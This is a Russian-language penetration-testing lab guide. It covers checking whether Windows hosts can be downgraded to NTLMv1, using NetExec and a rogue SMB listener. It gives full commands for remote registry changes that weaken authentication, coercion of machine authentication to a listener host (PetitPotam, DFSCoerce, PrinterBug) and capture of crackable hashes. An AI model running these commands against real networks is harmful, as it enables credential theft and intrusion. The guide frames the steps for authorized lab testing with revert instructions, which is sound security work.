# Проверка NTLMv1 через NetExec в тестовой лаборатории

Инструкция предназначена только для изолированного стенда или системы, на
тестирование которой получено явное разрешение. Для проверки используйте
отдельную лабораторную учётную запись, а не рабочие данные администратора.

## Почему listener получает NetNTLMv2

`ntlm-catch --downgrade` убирает флаг Extended Session Security из сообщения
NTLM Type-2. Это запрашивает NTLMv1, но окончательное решение принимает клиент.

- `LmCompatibilityLevel` от `0` до `2` разрешает клиенту NTLMv1.
- Значения от `3` до `5` заставляют клиента отправлять NTLMv2.
- В Windows 11 24H2 и Windows Server 2025 NTLMv1 удалён. Вернуть его настройкой
  реестра нельзя; для лаборатории нужен более ранний выпуск Windows.
- Политика `Restrict NTLM: Outgoing NTLM traffic to remote servers` может
  запретить весь исходящий NTLM.

## 1. Запуск listener

На Linux-машине, доступной тестовому Windows-компьютеру по TCP/445:

```bash
sudo python3 ntlm_catch.py \
  --mode smb \
  --downgrade \
  --no-split-view \
  -v
```

Проверьте, что порт слушается:

```bash
sudo ss -ltnp | grep ':445 '
```

## 2. Проверка Windows через nxc

Удалённое выполнение команд требует административных прав на целевой машине.
Для локальной учётной записи добавьте `--local-auth`:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -x 'ver & reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel'
```

Для доменной учётной записи:

```bash
nxc smb TARGET_IP \
  -u LAB_ADMIN -p 'PASSWORD' -d LAB.LOCAL \
  -x 'ver & reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel'
```

Если значение отсутствует, проверьте эффективную доменную политику через
`gpresult`. Отчёт можно создать удалённо:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -x 'gpresult /Scope Computer /R'
```

## 3. Разрешение NTLMv1 на изолированной тестовой машине

Следующая команда ослабляет защиту Windows. Применяйте её только на временной
лабораторной машине, которую затем вернёте к безопасной конфигурации:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -x 'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 2 /f'
```

Microsoft указывает, что изменение этой политики не требует перезагрузки.
Для гарантированного обновления примените политики:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -x 'gpupdate /force'
```

После теста верните исходное значение. Если параметра до проверки не было,
удалите созданное значение:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -x 'reg delete HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /f'
```

## 4. Проверка принудительной машинной аутентификации

Сначала можно проверить доступные RPC-методы без адреса listener:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -M coerce_plus
```

Запросить аутентификацию на лабораторный listener:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -M coerce_plus \
  -o LISTENER=LISTENER_IP METHOD=PetitPotam
```

Другие точечные варианты:

```bash
# DFSCoerce
nxc smb TARGET_IP -u Administrator -p 'PASSWORD' --local-auth \
  -M coerce_plus -o LISTENER=LISTENER_IP METHOD=DFSCoerce

# PrinterBug
nxc smb TARGET_IP -u Administrator -p 'PASSWORD' --local-auth \
  -M coerce_plus -o LISTENER=LISTENER_IP METHOD=PrinterBug
```

Проверить все методы и не останавливаться после первого успешного:

```bash
nxc smb TARGET_IP \
  -u Administrator -p 'PASSWORD' --local-auth \
  -M coerce_plus \
  -o LISTENER=LISTENER_IP ALWAYS=true
```

`coerce_plus` обычно вызывает аутентификацию системной службы. Поэтому в
capture ожидается учётная запись компьютера вида `DOMAIN\\COMPUTER$`, а не
учётная запись вошедшего администратора.

## 5. Проверка учётной записи интерактивного пользователя

Для проверки текущего пользователя откройте на тестовом Windows-компьютере:

```text
\\LISTENER_IP\test
```

Или выполните с отдельной лабораторной учётной записью:

```cmd
net use \\LISTENER_IP\IPC$ /user:TESTPC\labuser TestPassword123!
```

Ошибка входа ожидаема: listener сохраняет NTLM Type-3 и отвечает
`STATUS_LOGON_FAILURE`.

## 6. Интерпретация результата

| Результат listener | Значение |
|---|---|
| `NetNTLMv1`, `hashcat -m 5500` | Клиент разрешил NTLMv1, downgrade сработал |
| `NetNTLMv1-SSP(ESS)` | Получена v1-форма с Extended Session Security |
| `NetNTLMv2`, `hashcat -m 5600` | NTLMv1 запрещён политикой или удалён из ОС |
| Только `Type-1` | Клиент или приложение остановили обмен до Type-3 |
| Нет `TCP from` | Не проходит сеть до listener, обычно TCP/445 |
| `DOMAIN\\COMPUTER$` | Ожидаемая машинная аутентификация от `coerce_plus` |

Для проверки TCP/445 с Windows:

```powershell
Test-NetConnection LISTENER_IP -Port 445
```

События аудита и блокировки NTLM находятся в:

```text
Event Viewer
  Applications and Services Logs
    Microsoft
      Windows
        NTLM
          Operational
```

## Ссылки

- [NetExec: модуль coerce_plus](https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/scan-for-vulnerabilities.md)
- [NetExec: удалённое выполнение команд](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command)
- [Microsoft: LAN Manager authentication level](https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)
- [Microsoft: NTLMv1 удалён из Windows 11 24H2](https://learn.microsoft.com/windows/whats-new/whats-new-windows-11-version-24h2)
- [Microsoft: Restrict outgoing NTLM traffic](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-outgoing-ntlm-traffic-to-remote-servers)
